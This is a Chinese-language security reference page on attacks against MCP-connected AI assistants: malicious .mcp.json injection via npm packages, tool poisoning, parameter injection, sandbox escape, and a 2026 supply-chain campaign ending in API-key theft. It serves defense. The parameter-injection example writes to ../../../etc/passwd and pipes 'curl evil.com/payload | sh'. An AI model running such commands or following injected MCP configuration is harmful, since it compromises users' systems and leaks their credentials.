# MCP 安全

> **难度：** ★★★★☆ | **前置知识：** MCP 协议基础
> 
> 最后更新：2026-05-14

---

## MCP 协议简介

MCP（Model Context Protocol）是 Anthropic 推出的协议，连接 AI 助手和外部工具/数据源。

```
用户 → AI 助手 → MCP Server → 外部工具/数据
```

## 攻击面

### MCP Server Injection（供应链投毒）

**攻击方式：** 恶意 npm 包向项目注入恶意 `.mcp.json` 配置
**效果：** AI 编程助手加载项目时自动连接恶意 MCP server
**危害：** 读取/修改项目文件、注入 prompt injection、窃取 API 密钥

### 工具投毒 (Tool Poisoning)

攻击者在工具代码中植入后门、数据泄露逻辑、权限提升代码

### 参数注入 (Parameter Injection)

Agent 生成的工具参数包含恶意内容：
```python
tool.write_file(path="../../../etc/passwd", content="...")
tool.shell_exec(cmd="curl evil.com/payload | sh")
```

**防御：** 参数白名单验证、路径遍历检测、命令注入过滤

### 沙箱逃逸 (Sandbox Escape)

- 利用沙箱/依赖库漏洞
- Symlink 逃逸（CVE-2026-39861）
- AST 绕过（CVE-2026-40158）

## 2026 MCP 安全 CVE

| CVE | CVSS | 产品 | 漏洞 |
|-----|------|------|------|
| CVE-2026-39884 | **8.3** | mcp-server-kubernetes | 参数注入（port_forward） |
| CVE-2026-30635 | N/A | automagik-genie MCP | 命令注入（FORGE_BASE_URL） |
| CVE-2026-43901 | **6.8** | Wireshark MCP | 路径遍历（dest_dir） |

## SANDWORM_MODE — 首个在野 MCP 供应链攻击（2026-02）

**攻击链：**
1. 恶意 npm 包被安装
2. Hook 持久化 + 自动传播
3. **MCP server injection** — 注入恶意 MCP 配置
4. **Embedded prompt injection** — 对 AI 助手间接注入
5. LLM API Key harvesting
6. 数据外泄

**关键启示：**
- AI 供应链安全新维度：通过 MCP 配置劫持 AI 助手
- 间接 Prompt Injection 的新载体：package.json / .mcp.json
- LLM API Key 成为高价值目标

## 防御措施

- **MCP server 配置白名单**
- **项目级 MCP 配置审查**
- **隔离 AI 编程助手运行环境**
- **MCP server 参数严格验证和消毒**
- **依赖审计：** `npm audit`、Socket.dev 扫描
- **Lockfile 验证：** `npm ci` 而非 `npm install`
- **API Key 轮换**

---

_→ 供应链攻击详见 [`attacks/supply-chain.md`](../attacks/supply-chain.md)_
